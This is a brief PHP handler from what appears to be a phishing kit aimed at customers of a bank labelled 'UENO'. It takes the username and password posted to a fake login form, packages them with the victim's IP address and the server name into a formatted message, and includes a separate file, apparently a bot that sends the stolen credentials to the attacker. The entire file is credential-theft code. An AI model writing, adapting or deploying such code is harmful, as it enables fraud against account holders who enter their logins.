<?php  



$usu=$_POST['usu'];
$pass=$_POST['pass'];

  


	$enviara ="➖➖❕💲UENO💲❕➖➖\n".
  "<b>👤USER: </b>  <code>".$usu."</code>\n".
  "<b>🔑PASS: </b>  <code>".$pass."</code>\n".

  
  

  "🌐IP ".$_SERVER['REMOTE_ADDR']."\n";
  "🌐WEBSITE:".$_SERVER['SERVER_NAME']."\n".
  $enviar =  urldecode($enviara);
  include 'bot_id2.php';
?>
